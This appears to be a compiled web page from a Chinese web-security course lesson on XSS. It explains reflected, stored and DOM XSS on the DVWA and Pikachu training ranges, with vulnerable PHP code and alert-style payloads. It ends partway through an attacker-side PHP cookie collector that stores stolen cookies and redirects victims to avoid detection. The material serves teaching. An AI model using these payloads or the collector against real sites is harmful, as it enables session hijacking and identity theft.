import{_ as o,j as e,o as t,g as c,k as p,h as n,s,Q as l}from"./chunks/framework.4e7d56ce.js";const gs=JSON.parse('{"title":"起源 ","description":"","frontmatter":{},"headers":[],"relativePath":"posts/backEnd/Web 安全攻防之道_文档/(5972) 04  XSS：劫持身份的“惯犯”.md","filePath":"posts/backEnd/Web 安全攻防之道_文档/(5972) 04  XSS：劫持身份的“惯犯”.md","lastUpdated":1696417798000}'),r={name:"posts/backEnd/Web 安全攻防之道_文档/(5972) 04  XSS：劫持身份的“惯犯”.md"},E=s("p",null,"你好，我是赢少良。从本讲开始，我将带你进入 Web 漏洞攻防的世界，学习一些常见的 Web 漏洞的原理、利用与防御。",-1),y=s("p",null,[n("在这些常见的Web 漏洞中，XSS（Cross-site Script，跨站脚本）漏洞无疑是最多见的。根据 HackerOne 漏洞奖励平台发布的 "),s("em",null,"The 2020 Hacker Report"),n(' ，XSS 漏洞类型占所有报告漏洞中的 23％，排名第一。因此，在"'),s("strong",null,"模块二：漏洞攻防案例"),n('"，我特意以 XSS 作为讲解的第一个漏洞类型。')],-1),i=l('<p>图 1：HackerOne 平台上报告的漏洞类型占比</p><h3 id="起源" tabindex="-1">起源 <a class="header-anchor" href="#起源" aria-label="Permalink to &quot;起源&quot;">​</a></h3><p>最早的 XSS 漏洞可追溯到 1999 年末，微软安全工程师发现一些网站遭到攻击，网站被插入了一些恶意脚本和图像标签。随后，微软对此类漏洞进行研究分析，并在 2000 年 1 月，正式使用&quot;cross-site scripting&quot;这个名称，然后逐渐被业界采用，留传至今。</p><p>跨站脚本（Cross-site Script），按理应该简称为 CSS，但为了与层叠样式表（CSS）区分开，特意改为 XSS。</p><p>XSS 漏洞，通常指的是<strong>网站对用户输入数据未做有效过滤，攻击者可以将恶意脚本注入网站页面中，达到执行恶意代码的目的</strong>。攻击者只需要诱使受害者打开特定的网址，就可以在受害者的浏览器中执行被注入的恶意代码，从而窃取用户身份，执行一些敏感操作，或是进行其他的危害行为。</p><h3 id="危害-绝不仅仅只是弹框" tabindex="-1">危害：绝不仅仅只是弹框 <a class="header-anchor" href="#危害-绝不仅仅只是弹框" aria-label="Permalink to &quot;危害：绝不仅仅只是弹框&quot;">​</a></h3><p>一些听过 XSS的同学，可能仅停留在弹框的印象里；我曾在修复此类漏洞时，只是简单地针对alert 函数做了下过滤。这都是对 XSS 攻防原理理解不够造成的误解。其实，只要你想象力够丰富，它的危害是可以造成很大的。</p>',7),F=s("p",null,"图 2：常用于验证 XSS 漏洞的弹框",-1),d=s("p",null,'比如 2005 年 10 月 4 日诞生的世界上第一个 XSS 蠕虫：Samy（作者的名字）。Samy 利用网络社交媒体 MySpace的XSS 漏洞传播，受害者会自动将 Samy 本人添加为关注者，并在受害者的用户页面显示一行字串"but most of all，samy is my hero"，并再次插入恶意代码，谁访问受害者的网页谁就会被感染。',-1),g=s("p",null,"Samy 感染的用户呈指数倍增长，最终，超过 100 万用户被感染，作者也因事态发展失控而入狱，并被禁止 3 年内接触计算机，外加 90 小时的社区服务。",-1),u=s("p",null,"图 3：受 Samy 蠕虫攻击后，作者粉丝暴涨",-1),m=l('<p>图 4：受 Samy 蠕虫攻击后，受害者的用户页面被篡改</p><p>Samy 蠕虫是现实世界中 XSS 攻击的经典案例，除了蠕虫攻击外还有很多其他危害：盗号、钓鱼欺诈、篡改页面、刷广告流量、内网扫描、网页挂马、挖矿、键盘监听、窃取用户隐私等等。</p><p>如果能充分利用好业务场景下的功能，再结合一定技术和想象力，XSS 所造成的危害绝不仅仅只是弹框。如果你是开发，在修复 XSS 漏洞过程中，也别单纯想着怎么防止弹框。更为全面的防御方案，我会在下一讲《05｜XSS：漏洞的检测与防御》中介绍。</p><h3 id="xss-漏洞的分类" tabindex="-1">XSS 漏洞的分类 <a class="header-anchor" href="#xss-漏洞的分类" aria-label="Permalink to &quot;XSS 漏洞的分类&quot;">​</a></h3><p>通常 XSS 分为存储型和反射型，但还有一种比较特殊的 DOM 型 XSS，它本身属于反射型 XSS，不过介绍的时候需要单独来讲。因此，我就按 3 种类型划分：反射型、存储型、DOM 型。</p><h4 id="反射型-xss" tabindex="-1">反射型 XSS <a class="header-anchor" href="#反射型-xss" aria-label="Permalink to &quot;反射型 XSS&quot;">​</a></h4><p>我们首先来看反射型 XSS。反射型 XSS 又被称为非持久型跨站脚本，它是将攻击代码放在 URL 参数中，而不是存储到服务器，因此需要诱使用户点击才能触发攻击。</p><p>以 DVWA 中的反射型 XSS 题目为例，通过向 name 参数输入以下代码即可触发漏洞：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">script</span><span style="color:#F97583;">&gt;</span><span style="color:#B392F0;">alert</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">)</span><span style="color:#F97583;">&lt;/</span><span style="color:#E1E4E8;">script</span><span style="color:#F97583;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">script</span><span style="color:#D73A49;">&gt;</span><span style="color:#6F42C1;">alert</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">)</span><span style="color:#D73A49;">&lt;/</span><span style="color:#24292E;">script</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div>',9),A=s("p",null,"图5：利用 XSS 漏洞执行注入的JS代码",-1),C=s("p",null,'在 Chrome 浏览器中，用"检查"功能看下网页源码，可以发现我们输入的代码被解析并执行了：',-1),_=l(`<p>图6：被解析执行的注入的代码</p><p>其漏洞代码也非常简单。从 GET 参数 name 获取用户输入后，未经过滤就直接调用 echo 函数输出到页面，最终导致 XSS 的产生。漏洞代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#6A737D;">// Is there any input?</span></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( </span><span style="color:#79B8FF;">array_key_exists</span><span style="color:#E1E4E8;">( </span><span style="color:#9ECBFF;">&quot;name&quot;</span><span style="color:#E1E4E8;">, $_GET ) </span><span style="color:#F97583;">&amp;&amp;</span><span style="color:#E1E4E8;"> $_GET[ </span><span style="color:#9ECBFF;">&#39;name&#39;</span><span style="color:#E1E4E8;"> ] </span><span style="color:#F97583;">!=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;"> ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Feedback for end user</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">echo</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;pre&gt;Hello &#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> $_GET[ </span><span style="color:#9ECBFF;">&#39;name&#39;</span><span style="color:#E1E4E8;"> ] </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;/pre&gt;&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#6A737D;">// Is there any input?</span></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">( </span><span style="color:#005CC5;">array_key_exists</span><span style="color:#24292E;">( </span><span style="color:#032F62;">&quot;name&quot;</span><span style="color:#24292E;">, $_GET ) </span><span style="color:#D73A49;">&amp;&amp;</span><span style="color:#24292E;"> $_GET[ </span><span style="color:#032F62;">&#39;name&#39;</span><span style="color:#24292E;"> ] </span><span style="color:#D73A49;">!=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;"> ) {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Feedback for end user</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">echo</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;pre&gt;Hello &#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> $_GET[ </span><span style="color:#032F62;">&#39;name&#39;</span><span style="color:#24292E;"> ] </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;/pre&gt;&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>有人认为反射型 XSS 的危害不如存储型 XSS，但我认为没有什么区别。这里的挑战主要是URL是否包含攻击代码。</p><h4 id="存储型-xss" tabindex="-1">存储型 XSS <a class="header-anchor" href="#存储型-xss" aria-label="Permalink to &quot;存储型 XSS&quot;">​</a></h4><p>第二种 XSS 漏洞是存储型 XSS，它又被称为持久型跨站脚本。攻击者将恶意代码存储到服务器上，只要诱使受害者访问被插入恶意代码的页面即可触发。存储型 XSS 经常出现在一些可以发表评论的地方，如帖子、博客。</p><p>在 DVWA 靶场中就有一个存储型 XSS 案例，它是个留言本的功能，支持用户发表评论，然后将用户输入的数据直接存储到数据库，并输出到页面上。这个过程中因为未做任何的过滤，导致了 XSS 漏洞的产生。</p>`,7),h=l(`<p>图 7：DVWA 靶场中的存储型 XSS</p><p><strong>存储型 XSS 的特点就是不需要在诱使用户访问的URL中包含攻击代码</strong>，因为它已经存储到了服务器中，只需要让用户访问包含输出攻击代码的页面即可，漏洞代码如下：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">( </span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">( $_POST[ </span><span style="color:#9ECBFF;">&#39;btnSign&#39;</span><span style="color:#E1E4E8;"> ] ) ) {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Get input</span></span>
<span class="line"><span style="color:#E1E4E8;">    $message </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">trim</span><span style="color:#E1E4E8;">( $_POST[ </span><span style="color:#9ECBFF;">&#39;mtxMessage&#39;</span><span style="color:#E1E4E8;"> ] );</span></span>
<span class="line"><span style="color:#E1E4E8;">    $name    </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">trim</span><span style="color:#E1E4E8;">( $_POST[ </span><span style="color:#9ECBFF;">&#39;txtName&#39;</span><span style="color:#E1E4E8;"> ] );</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Sanitize message input</span></span>
<span class="line"><span style="color:#E1E4E8;">    $message </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">stripslashes</span><span style="color:#E1E4E8;">( $message );</span></span>
<span class="line"><span style="color:#E1E4E8;">    $message </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">mysql_real_escape_string</span><span style="color:#E1E4E8;">( $message );</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Sanitize name input</span></span>
<span class="line"><span style="color:#E1E4E8;">    $name </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">mysql_real_escape_string</span><span style="color:#E1E4E8;">( $name );</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// Update database</span></span>
<span class="line"><span style="color:#E1E4E8;">    $query  </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;</span><span style="color:#F97583;">INSERT INTO</span><span style="color:#9ECBFF;"> guestbook ( comment, </span><span style="color:#F97583;">name</span><span style="color:#9ECBFF;"> ) </span><span style="color:#F97583;">VALUES</span><span style="color:#9ECBFF;"> ( &#39;</span><span style="color:#E1E4E8;">$message</span><span style="color:#9ECBFF;">&#39;, &#39;</span><span style="color:#E1E4E8;">$name</span><span style="color:#9ECBFF;">&#39; );&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    $result </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">mysql_query</span><span style="color:#E1E4E8;">( $query ) </span><span style="color:#F97583;">or</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">die</span><span style="color:#E1E4E8;">( </span><span style="color:#9ECBFF;">&#39;&lt;pre&gt;&#39;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">mysql_error</span><span style="color:#E1E4E8;">() </span><span style="color:#F97583;">.</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;&lt;/pre&gt;&#39;</span><span style="color:#E1E4E8;"> );</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">//mysql_close();</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">( </span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">( $_POST[ </span><span style="color:#032F62;">&#39;btnSign&#39;</span><span style="color:#24292E;"> ] ) ) {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Get input</span></span>
<span class="line"><span style="color:#24292E;">    $message </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">trim</span><span style="color:#24292E;">( $_POST[ </span><span style="color:#032F62;">&#39;mtxMessage&#39;</span><span style="color:#24292E;"> ] );</span></span>
<span class="line"><span style="color:#24292E;">    $name    </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">trim</span><span style="color:#24292E;">( $_POST[ </span><span style="color:#032F62;">&#39;txtName&#39;</span><span style="color:#24292E;"> ] );</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Sanitize message input</span></span>
<span class="line"><span style="color:#24292E;">    $message </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">stripslashes</span><span style="color:#24292E;">( $message );</span></span>
<span class="line"><span style="color:#24292E;">    $message </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">mysql_real_escape_string</span><span style="color:#24292E;">( $message );</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Sanitize name input</span></span>
<span class="line"><span style="color:#24292E;">    $name </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">mysql_real_escape_string</span><span style="color:#24292E;">( $name );</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// Update database</span></span>
<span class="line"><span style="color:#24292E;">    $query  </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;</span><span style="color:#D73A49;">INSERT INTO</span><span style="color:#032F62;"> guestbook ( comment, </span><span style="color:#D73A49;">name</span><span style="color:#032F62;"> ) </span><span style="color:#D73A49;">VALUES</span><span style="color:#032F62;"> ( &#39;</span><span style="color:#24292E;">$message</span><span style="color:#032F62;">&#39;, &#39;</span><span style="color:#24292E;">$name</span><span style="color:#032F62;">&#39; );&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    $result </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">mysql_query</span><span style="color:#24292E;">( $query ) </span><span style="color:#D73A49;">or</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">die</span><span style="color:#24292E;">( </span><span style="color:#032F62;">&#39;&lt;pre&gt;&#39;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">mysql_error</span><span style="color:#24292E;">() </span><span style="color:#D73A49;">.</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;&lt;/pre&gt;&#39;</span><span style="color:#24292E;"> );</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">//mysql_close();</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#D73A49;">?&gt;</span></span></code></pre></div><p>从 POST 参数中获取 mtxMessage 和 txtName 参数后，虽然经过一定过滤才插入到数据库中，但是中括号不会被过滤，在其他地方将其输出到页面后就会被解析（如图 5）。我们在 Message 中输入&quot;<code>&lt;script&gt;</code>alert(1)<code>&lt;/script&gt;</code>&quot;，点击&quot;Sign Guestbook&quot;提交，即可触发漏洞。</p>`,4),D=s("p",null,"图 8：触发漏洞弹框",-1),S=s("p",null,[n('利用 Chrome 浏览器的"检查"功能查看网页源码，可以发现刚才输入消息中的'),s("code",null,"<script>"),n("标签被解析了：")],-1),B=s("p",null,"图 9：script 标签被解析",-1),k=s("p",null,"正是它导致弹框的出现。",-1),b=s("h4",{id:"dom-型-xss",tabindex:"-1"},[n("DOM 型 XSS "),s("a",{class:"header-anchor",href:"#dom-型-xss","aria-label":'Permalink to "DOM 型 XSS"'},"​")],-1),v=s("p",null,"最后是 DOM 型 XSS 漏洞，它是基于文档对象模型（Document Object Model，DOM，用于将 Web 页面与脚本语言链接起来的标准编程接口）的一种漏洞，它不经过服务端，而是通过 URL 传入参数去触发，因此也属于反射型 XSS。",-1),T=s("p",null,"由于客户端的 JavaScript 可以访问浏览器页面中的 DOM 对象，因此它能够决定如何处理当前页面的 URL，比如获取 URL 中的相关数据进行处理，然后动态更新到页面上。这导致 DOM 型 XSS 的漏洞代码常位于网页的 JavaScript 代码中。",-1),q=s("p",null,'以 Pikachu 漏洞练习平台中的"DOM 型 XSS"题目为例：它只有一个文本输入框，外加一个"click me!"的按钮。我们先看下网页源码，看点击按钮后的回调函数。',-1),f=s("p",null,"图 10：定位按钮的回调函数",-1),X=s("p",null,"可以看到，点击后会执行一个叫 domxss 的函数。在源码内搜索下该函数。",-1),x=s("p",null,"图 11：domxss 函数",-1),$=s("p",null,'domxss 函数就 2 行代码，第一行代码先通过 document.getElementById("text").value 获取 ID 为"text"的元素内容。其实这就是输入框的内容，输入框的 ID就叫"text"。',-1),w=s("p",null,"图12：id 为 text 的输入框",-1),M=s("p",null,'第二行代码是将获取的输入框内容传递给 ID 为"dom"的元素，并将其写入 innerHTML，也就是输出到 HTML 页面中，整个过程对用户输入数据都未做任何过滤。直接输入 test 看下：',-1),R=l('<p>图13：用户数据的输出位置</p><p>可以看到，输入框的内容输出到了 dom 元素中，作为 a 标签的链接地址。我们直接利用 JavaScript 伪协议来构造链接触发 JS 代码的执行，输入以下代码，然后点击&quot;what do you see?&quot;链接后即可触发漏洞：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">javascript</span><span style="color:#F97583;">:</span><span style="color:#B392F0;">alert</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">javascript</span><span style="color:#D73A49;">:</span><span style="color:#6F42C1;">alert</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">)</span></span></code></pre></div>',3),H=s("p",null,"图 14：利用 javascript 伪协议触发漏洞",-1),P=s("p",null,"导致 DOM 型 XSS 的相关 DOM 操作函数有很多，这里我只是举了比较常见的 innerHTML 属性设置导致的漏洞为例子，其他的还有像 eval、document.write 等可触发漏洞的数据输出位置。",-1),O=s("p",null,"网上曾有人整理了一份关于 DOM XSS 的数据污染源（Source，即用户输入数据）和漏洞触发点（Sink）的列表（虽然不够全面，但可以作为参考），如下图所示：",-1),I=l('<p>图 15：DOM XSS Sources &amp; Sinks</p><p>若数据从 Source 传到 Sink 过程中，未做任何过滤，就有可能存在 DOM XSS。这个思路也常作为动静态检测 DOM XSS 的重要思路，具体会在下一讲中介绍。</p><h3 id="攻击-xss-漏洞" tabindex="-1">攻击 XSS 漏洞 <a class="header-anchor" href="#攻击-xss-漏洞" aria-label="Permalink to &quot;攻击 XSS 漏洞&quot;">​</a></h3><p>这里开始我想给你介绍一些关于 XSS 漏洞利用的方法，避免你停留在 XSS 只能弹框的思想层面。</p><p>针对 XSS 漏洞最为常见的两种攻击方式就是窃取 Cookie 劫持他人的会话，以及前面介绍过的蠕虫攻击。因此，这里会重点介绍这两者的相关技术，同时也涉及一些其他的攻击思路，最后会引出一些自动化利用工具的使用。</p><h4 id="窃取-cookie" tabindex="-1">窃取 Cookie <a class="header-anchor" href="#窃取-cookie" aria-label="Permalink to &quot;窃取 Cookie&quot;">​</a></h4><p>我们首先来看&quot;窃取 Cookie&quot;。</p><p>Cookie 是由服务器提供的存储在客户端的数据，允许 JavaScript 访问，常用于识别用户身份和保存会话等功能。如果 Web 应用程序存在 XSS 漏洞，那么攻击者通过注入恶意 JavaScript 脚本就可以窃取到 Cookie，进而以用户身份执行恶意操作。</p><p>通过 document.cookie 就可以访问到 Cookie。以百度网站为例，在检查工具中的 Console 标签页输入 document.cookie 就可以看到当前百度域名下的 Cookie 值。</p>',9),j=l('<p>图 16：百度 Cookie</p><p>当一个网站存在 XSS 时，我们就可以通过执行 document.cookie 获取当前受害者的 cookie，前提是要先诱使受害者访问特定的 URL。</p><p>以 Pikachu 中的反射型 XSS(Get) 题目为例，其触发链接为：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit</span></span></code></pre></div><p>访问后的效果：</p>',5),V=l('<p>图 17：Pikachu 中的反射型 XSS(Get) 利用</p><p>我们试试看能否读取 cookie：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;submit=submit</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;submit=submit</span></span></code></pre></div><p>可以访问到 cookie：</p>',4),L=l(`<p>图 18：成功通过 JS 读取 Cookie</p><p>接下来，我们就可以在自己控制的服务器写个接收 cookie 的接口，比如 cookie.php。刚好 Pikachu 靶场自带这样的功能，我以它为例，并加了关键代码的注释：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;?</span><span style="color:#79B8FF;">php</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">include_once</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;../inc/config.inc.php&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">include_once</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;../inc/mysql.inc.php&#39;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	$link</span><span style="color:#F97583;">=</span><span style="color:#B392F0;">connect</span><span style="color:#E1E4E8;">();  </span><span style="color:#6A737D;">// 连接数据库</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#6A737D;">//这个是获取 cookie 的 api 页面</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">isset</span><span style="color:#E1E4E8;">($_GET[</span><span style="color:#9ECBFF;">&#39;cookie&#39;</span><span style="color:#E1E4E8;">])){  </span><span style="color:#6A737D;">// 通过 GET 参数 cookie 来接收数据</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $time</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">date</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;Y-m-d g:i:s&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $ipaddress</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">getenv</span><span style="color:#E1E4E8;"> (</span><span style="color:#9ECBFF;">&#39;REMOTE_ADDR&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $cookie</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_GET[</span><span style="color:#9ECBFF;">&#39;cookie&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $referer</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_SERVER[</span><span style="color:#9ECBFF;">&#39;HTTP_REFERER&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $useragent</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">$_SERVER[</span><span style="color:#9ECBFF;">&#39;HTTP_USER_AGENT&#39;</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $query</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) </span></span>
<span class="line"><span style="color:#9ECBFF;">	    values(&#39;</span><span style="color:#E1E4E8;">$time</span><span style="color:#9ECBFF;">&#39;,&#39;</span><span style="color:#E1E4E8;">$ipaddress</span><span style="color:#9ECBFF;">&#39;,&#39;</span><span style="color:#E1E4E8;">$cookie</span><span style="color:#9ECBFF;">&#39;,&#39;</span><span style="color:#E1E4E8;">$referer</span><span style="color:#9ECBFF;">&#39;,&#39;</span><span style="color:#E1E4E8;">$useragent</span><span style="color:#9ECBFF;">&#39;)&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">	    $result</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">mysqli_query</span><span style="color:#E1E4E8;">($link, $query); </span><span style="color:#6A737D;">// 将窃取的数据存入数据库</span></span>
<span class="line"><span style="color:#E1E4E8;">	}</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#79B8FF;">header</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Location:http://192.168.1.4/pikachu/index.php&quot;</span><span style="color:#E1E4E8;">);</span><span style="color:#6A737D;">//重定向到一个可信的网站，主要起到隐藏作用，避免被发现</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span></span>
<span class="line"><span style="color:#E1E4E8;">	</span><span style="color:#F97583;">?&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;?</span><span style="color:#005CC5;">php</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">include_once</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;../inc/config.inc.php&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">include_once</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;../inc/mysql.inc.php&#39;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">	$link</span><span style="color:#D73A49;">=</span><span style="color:#6F42C1;">connect</span><span style="color:#24292E;">();  </span><span style="color:#6A737D;">// 连接数据库</span></span>
<span class="line"><span style="color:#24292E;">	</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#6A737D;">//这个是获取 cookie 的 api 页面</span></span>
<span class="line"><span style="color:#24292E;">	</span><span style="color:#D73A49;">if</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">isset</span><span style="color:#24292E;">($_GET[</span><span style="color:#032F62;">&#39;cookie&#39;</span><span style="color:#24292E;">])){  </span><span style="color:#6A737D;">// 通过 GET 参数 cookie 来接收数据</span></span>
